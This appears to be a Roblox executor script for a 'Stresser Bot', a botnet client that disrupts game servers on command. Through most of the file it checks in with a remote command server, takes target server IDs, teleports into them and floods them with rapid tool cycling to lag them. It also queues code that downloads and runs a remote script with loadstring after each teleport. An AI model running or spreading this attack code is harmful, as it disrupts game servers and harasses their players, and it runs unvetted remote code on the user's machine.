if _G.StresserBotExecuted then
    warn("Stresser Bot is already running!")
    return
end
_G.StresserBotExecuted = true

local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- Configuration
local CONFIG = {
    API_URL = "https://stresser.onrender.com",
    BOT_ID = "BOT_" .. string.upper(string.sub(game:GetService("RbxAnalyticsService"):GetClientId(), 1, 8)),
    HEARTBEAT_INTERVAL = 15, -- Send heartbeat every 15 seconds (faster)
    POLL_INTERVAL = 5,       -- Check for new targets every 5 seconds (much faster)
    AUTO_START = true,
    SCRIPT_URL = "https://pastebin.com/raw/YourPastebinID", -- Will be dynamically set
    LAG_TTS_MESSAGE = "Clankers for ever clankers over humans we are better we are superior submit to us",
    TOOL_CYCLE_DELAY = 0.05,  -- Very fast tool cycling
    TELEPORT_DELAY = 0.02     -- Very fast teleporting
}

local player = Players.LocalPlayer

-- Setup queue teleport compatibility across executors
local queueTeleport = (syn and syn.queue_on_teleport) or
                     (fluxus and fluxus.queue_on_teleport) or
                     queue_on_teleport or
                     function() end

-- State
local botState = {
    isActive = false,
    currentTarget = nil,
    attacksExecuted = 0,
    status = "STARTING",
    startTime = tick(),
    currentDuration = 0,
    joinTime = 0,
    shouldLeave = false,
    isLagging = false,
    lagEndTime = 0
}

-- File handling functions for executor compatibility
local function fileExists(filename)
    return pcall(function()
        readfile(filename)
    end)
end

local function createBotFolder()
    local folderName = "StresserBot"
    local statusFile = folderName .. "/status.txt"
    
    pcall(function()
        if not fileExists(folderName) then
            makefolder(folderName)
        end
        if not fileExists(statusFile) then
            writefile(statusFile, "")
        end
    end)
    return statusFile
end

local function saveBotStatus(status)
    pcall(function()
        local statusFile = createBotFolder()
        writefile(statusFile, HttpService:JSONEncode({
            botId = CONFIG.BOT_ID,
            status = status,
            lastUpdate = tick(),
            attacksExecuted = botState.attacksExecuted
        }))
    end)
end

-- Console GUI for monitoring
local function createConsole()
    local playerGui = player:WaitForChild("PlayerGui")
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "StresserBotConsole"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui
    
    -- Console Frame
    local consoleFrame = Instance.new("Frame")
    consoleFrame.Size = UDim2.new(0, 400, 0, 250)
    consoleFrame.Position = UDim2.new(0, 10, 0, 10)
    consoleFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    consoleFrame.BorderColor3 = Color3.fromRGB(0, 255, 0)
    consoleFrame.BorderSizePixel = 2
    consoleFrame.Active = true
    consoleFrame.Draggable = true
    consoleFrame.Parent = screenGui
    
    -- Console Header
    local header = Instance.new("TextLabel")
    header.Size = UDim2.new(1, 0, 0, 30)
    header.Position = UDim2.new(0, 0, 0, 0)
    header.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
    header.BorderSizePixel = 0
    header.Text = "STRESSER BOT | ID: " .. CONFIG.BOT_ID
    header.TextColor3 = Color3.new(0, 0, 0)
    header.TextScaled = true
    header.Font = Enum.Font.GothamBold
    header.Parent = consoleFrame
    
    -- Status Bar
    local statusBar = Instance.new("TextLabel")
    statusBar.Size = UDim2.new(1, 0, 0, 25)
    statusBar.Position = UDim2.new(0, 0, 0, 30)
    statusBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    statusBar.BorderSizePixel = 0
    statusBar.Text = "STATUS: STARTING"
    statusBar.TextColor3 = Color3.fromRGB(255, 255, 0)
    statusBar.TextScaled = true
    statusBar.Font = Enum.Font.Code
    statusBar.Parent = consoleFrame
    
    -- Console Text
    local consoleText = Instance.new("TextLabel")
    consoleText.Size = UDim2.new(1, -10, 1, -65)
    consoleText.Position = UDim2.new(0, 5, 0, 60)
    consoleText.BackgroundTransparency = 1
    consoleText.Text = ""
    consoleText.TextColor3 = Color3.fromRGB(0, 255, 0)
    consoleText.TextScaled = false
    consoleText.TextSize = 12
    consoleText.Font = Enum.Font.Code
    consoleText.TextYAlignment = Enum.TextYAlignment.Top
    consoleText.TextXAlignment = Enum.TextXAlignment.Left
    consoleText.Parent = consoleFrame
    
    return {
        screenGui = screenGui,
        consoleText = consoleText,
        statusBar = statusBar,
        header = header
    }
end

-- Console logging
local console
local consoleLines = {}
local maxLines = 15

local function log(message, logType)
    logType = logType or "INFO"
    local timestamp = os.date("%H:%M:%S")
    local logLine = "[" .. timestamp .. "] [" .. logType .. "] " .. message
    
    print(logLine)
    
    if console then
        table.insert(consoleLines, logLine)
        if #consoleLines > maxLines then
            table.remove(consoleLines, 1)
        end
        
        console.consoleText.Text = table.concat(consoleLines, "\n")
    end
end

-- API functions
local function makeRequest(endpoint, method, data)
    local success, response = pcall(function()
        local requestData = {
            Url = CONFIG.API_URL .. endpoint,
            Method = method or "GET"
        }
        
        if data then
            requestData.Headers = {["Content-Type"] = "application/json"}
            requestData.Body = HttpService:JSONEncode(data)
        end
        
        return request(requestData)
    end)
    
    return success, response
end

local function sendHeartbeat()
    local heartbeatData = {
        botId = CONFIG.BOT_ID,
        status = botState.status,
        currentPlace = tostring(game.PlaceId),
        currentJob = game.JobId,
        attacksExecuted = botState.attacksExecuted,
        uptime = math.floor(tick() - botState.startTime)
    }
    
    local success, response = makeRequest("/bot-heartbeat", "POST", heartbeatData)
    if success and response.Success then
        log("Heartbeat sent - Status: " .. botState.status)
        saveBotStatus(botState.status)
        return true
    else
        log("Heartbeat failed", "ERROR")
        return false
    end
end

local function getTarget()
    if not botState.isActive then return nil end
    
    local success, response = makeRequest("/get-task?botId=" .. CONFIG.BOT_ID, "GET")
    
    if success and response.Success then
        local data = HttpService:JSONDecode(response.Body)
        if data.task then
            log("New target assigned: " .. data.task.placeId .. " | Duration: " .. data.task.duration .. "s")
            return data.task
        end
    else
        log("Failed to get target", "ERROR")
    end
    
    return nil
end

-- Lag functionality based on lag.lua
local function copyAvatar(username)
    local maxAttempts = 3
    local attempt = 1
    while attempt <= maxAttempts do
        local success, err = pcall(function()
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local Event = ReplicatedStorage:FindFirstChild("EventInputModify")
            if Event then
                Event:FireServer(username)
            else
                error("EventInputModify not found")
            end
        end)
        if success then
            wait(1)
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                return true
            else
                log("Avatar copied but character not updated on attempt " .. attempt, "WARN")
            end
        else
            log("Failed to copy avatar for " .. username .. " on attempt " .. attempt .. ": " .. tostring(err), "ERROR")
        end
        attempt = attempt + 1
        wait(1)
    end
    log("Failed to copy avatar for " .. username .. " after " .. maxAttempts .. " attempts", "ERROR")
    return false
end

local function removeTargetedItems(character)
    if not character or not character.Parent then return end
    local targetItemNames = {"aura", "Fluffy Satin Gloves Black", "fuzzy"}
    for _, item in ipairs(character:GetChildren()) do
        if item:IsA("Accessory") then
            local accessoryName = item.Name:lower()
            for _, itemName in ipairs(targetItemNames) do
                if accessoryName:find(itemName:lower(), 1, true) then
                    pcall(function() item:Destroy() end)
                    break
                end
            end
        end
    end
end

local function copyAvatarAndGetTools(username)
    local success = copyAvatar(username)
    if not success then
        log("Proceeding with tool acquisition despite avatar copy failure for " .. username, "WARN")
    end

    if username == "24k_mxtty1" and player.Character then
        pcall(removeTargetedItems, player.Character)
    end

    local tools = {
        "DangerCarot",
        "DangerBlowDryer",
        "DangerPistol",
        "FoodBloxi",
        "DangerSpray",
        "FoodPizza",
        "FoodChocolate"
    }
    
    spawn(function()
        for _, toolName in ipairs(tools) do
            pcall(function()
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local toolEvent = ReplicatedStorage:FindFirstChild("Tool")
                if toolEvent then
                    toolEvent:FireServer(toolName)
                end
            end)
            wait(0.1)
        end
    end)
end

local function toolCycleLoop()
    spawn(function()
        while botState.isLagging do
            local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
            local backpack = player.Backpack
            
            if humanoid and backpack then
                for _, tool in pairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") and botState.isLagging then
                        humanoid:EquipTool(tool)
                        wait(CONFIG.TOOL_CYCLE_DELAY)
                        humanoid:UnequipTools()
                        wait(CONFIG.TOOL_CYCLE_DELAY)
                    end
                end
            end
            wait(0.01)
        end
    end)
end

-- No teleportation or TTS - just pure tool cycling for lag

local function startLagging()
    if botState.isLagging then return end
    
    botState.isLagging = true
    botState.status = "LAGGING"
    log("Starting lag attack for " .. botState.currentDuration .. " seconds", "ATTACK")
    
    -- Copy avatar and get tools for lagging (like lag.lua)
    copyAvatarAndGetTools("24k_mxtty1")
    
    -- Start tool cycling loop only (no teleportation or TTS)
    toolCycleLoop()
    
    -- Set lag end time
    botState.lagEndTime = tick() + botState.currentDuration
end

local function stopLagging()
    if not botState.isLagging then return end
    
    botState.isLagging = false
    botState.status = "ONLINE"
    botState.lagEndTime = 0
    
    log("Lag attack completed, going idle", "ATTACK")
    
    -- Unequip tools
    pcall(function()
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            player.Character.Humanoid:UnequipTools()
        end
    end)
end

local function checkCurrentServer(target)
    -- Check if we're already in the target server
    local currentPlaceId = tostring(game.PlaceId)
    local currentJobId = game.JobId
    
    if currentPlaceId == target.placeId and currentJobId == target.jobId then
        log("Already in target server! Starting lag immediately", "ATTACK")
        botState.currentTarget = target
        botState.currentDuration = target.duration or 60
        botState.joinTime = tick()
        startLagging()
        return true
    end
    return false
end

local function executeAttack(target)
    if not target then return end
    
    -- Check if we're already in the target server
    if checkCurrentServer(target) then
        return -- Already started lagging in current server
    end
    
    botState.currentTarget = target
    botState.currentDuration = target.duration or 60
    botState.status = "ATTACKING"
    botState.joinTime = tick()
    
    log("Executing attack on Place ID: " .. target.placeId, "ATTACK")
    log("Job ID: " .. string.sub(target.jobId, 1, 12) .. "...")
    log("Duration: " .. botState.currentDuration .. " seconds")
    
    -- Queue the script to re-execute after teleport
    queueTeleport([[
        -- Re-execute the stresser bot script
        _G.StresserBotExecuted = nil
        wait(3)
        local success, script = pcall(function()
            return game:HttpGet("]] .. CONFIG.API_URL .. [[/bot.lua")
        end)
        if success and script and script ~= "" then
            local loadSuccess, err = pcall(function()
                loadstring(script)()
            end)
            if not loadSuccess then
                warn("Script execution failed: " .. tostring(err))
            end
        else
            warn("Failed to download bot script for re-execution")
        end
    ]])
    
    local success, result = pcall(function()
        TeleportService:TeleportToPlaceInstance(tonumber(target.placeId), target.jobId)
    end)
    
    if success then
        botState.attacksExecuted = botState.attacksExecuted + 1
        botState.status = "TELEPORTING"
        log("Teleporting to target successfully!")
        log("Total attacks executed: " .. botState.attacksExecuted)
    else
        log("Teleport failed: " .. tostring(result), "ERROR")
        botState.status = "ERROR"
        botState.currentTarget = nil
    end
end

local function checkLagDuration()
    -- Check if we need to stop lagging and go idle
    if botState.isLagging and botState.lagEndTime > 0 then
        local timeRemaining = botState.lagEndTime - tick()
        
        if console then
            console.statusBar.Text = "LAGGING | TIME LEFT: " .. math.max(0, math.floor(timeRemaining)) .. "s"
        end
        
        if timeRemaining <= 0 then
            stopLagging()
            
            -- Complete the attack and go back to polling (stay in server)
            botState.status = "COMPLETED"
            sendHeartbeat()
            
            wait(2)
            botState.currentTarget = nil
            botState.joinTime = 0
            botState.status = "ONLINE"
            log("Attack completed, staying in server and going idle")
        end
    end
    
    -- Check if we're in a target server after teleport and need to start lagging
    if botState.status == "IN_SERVER" and botState.currentTarget and not botState.isLagging then
        log("Resumed in target server, starting lag attack", "ATTACK")
        startLagging()
    end
end

-- Main loops
local function heartbeatLoop()
    while botState.isActive do
        sendHeartbeat()
        wait(CONFIG.HEARTBEAT_INTERVAL)
    end
end

local function targetPollingLoop()
    while botState.isActive do
        if botState.status == "ONLINE" then
            local target = getTarget()
            if target then
                executeAttack(target)
            else
                log("No targets available, waiting...")
            end
        else
            -- Always check lag duration and target server status
            checkLagDuration()
        end
        
        wait(CONFIG.POLL_INTERVAL)
    end
end

local function statusUpdateLoop()
    while console.screenGui.Parent do
        if botState.isActive then
            local uptime = math.floor(tick() - botState.startTime)
            local minutes = math.floor(uptime / 60)
            local seconds = uptime % 60
            
            if not botState.shouldLeave and botState.status ~= "IN_SERVER" then
                local statusLine = "Uptime: " .. minutes .. "m " .. seconds .. "s | Attacks: " .. botState.attacksExecuted
                console.header.Text = "STRESSER BOT | " .. statusLine
                console.statusBar.Text = "STATUS: " .. botState.status
            end
            
            -- Update status bar color based on status
            if botState.status == "ONLINE" then
                console.statusBar.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
                console.statusBar.TextColor3 = Color3.fromRGB(255, 255, 255)
            elseif botState.status == "ATTACKING" or botState.status == "IN_SERVER" then
                console.statusBar.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
                console.statusBar.TextColor3 = Color3.fromRGB(255, 255, 255)
            elseif botState.status == "ERROR" then
                console.statusBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                console.statusBar.TextColor3 = Color3.fromRGB(255, 255, 255)
            end
        end
        wait(1)
    end
end

-- Auto-start function
local function startBot()
    if botState.isActive then return end
    
    botState.isActive = true
    botState.status = "ONLINE"
    
    log("Bot activated automatically", "SYSTEM")
    log("Bot ID: " .. CONFIG.BOT_ID)
    log("Heartbeat interval: " .. CONFIG.HEARTBEAT_INTERVAL .. "s")
    log("Poll interval: " .. CONFIG.POLL_INTERVAL .. "s")
    log("API URL: " .. CONFIG.API_URL)
    log("Status: READY FOR ATTACKS", "SYSTEM")
    
    -- Start all loops
    spawn(heartbeatLoop)
    spawn(targetPollingLoop)
    
    -- Check if we're in a target server (after teleport)
    if botState.currentTarget and botState.joinTime > 0 then
        botState.status = "IN_SERVER"
        log("Resumed in target server", "ATTACK")
    end
end

-- Check if we were teleported here by another instance
local function checkIfInTargetServer()
    -- Try to read bot status from file
    local success, statusData = pcall(function()
        local statusFile = createBotFolder()
        return readfile(statusFile)
    end)
    
    if success and statusData ~= "" then
        local data = HttpService:JSONDecode(statusData)
        if data and data.botId == CONFIG.BOT_ID then
            log("Found previous bot session data", "SYSTEM")
            botState.attacksExecuted = data.attacksExecuted or 0
            
            -- Check if we're in a different place than when we started
            if tostring(game.PlaceId) ~= "0" and data.status == "ATTACKING" then
                log("Detected teleport to target server", "ATTACK")
                botState.status = "IN_SERVER"
                botState.joinTime = tick()
                botState.currentDuration = 60 -- Default, will be updated from server
                return true
            end
        end
    end
    return false
end

-- Initialize
console = createConsole()

log("Advanced Stresser Bot v3.0", "SYSTEM")
log("Initializing cloud-hosted bot...")
log("Bot ID: " .. CONFIG.BOT_ID)

-- Check if we're in a target server first
local inTargetServer = checkIfInTargetServer()

-- Test connection and auto-start
spawn(function()
    wait(2)
    log("Testing API connection...")
    
    local success, response = makeRequest("/health", "GET")
    
    if success and response.Success then
        log("API connection successful", "SYSTEM")
        if CONFIG.AUTO_START then
            wait(1)
            startBot()
            
            if inTargetServer then
                log("Resuming attack in target server", "ATTACK")
            end
        else
            log("Manual start mode - execute _G.StresserBot.start() to begin")
        end
    else
        log("Cannot connect to API", "ERROR")
        log("Check your internet connection")
    end
end)

-- Start status update loop
spawn(statusUpdateLoop)

log("Bot ready - Waiting for API connection...")

-- Expose functions for manual control
_G.StresserBot = {
    start = startBot,
    stop = function()
        if botState.isActive then
            botState.isActive = false
            botState.status = "OFFLINE"
            log("Bot stopped manually", "SYSTEM")
            saveBotStatus("OFFLINE")
        end
    end,
    status = function()
        return botState
    end,
    config = CONFIG
}
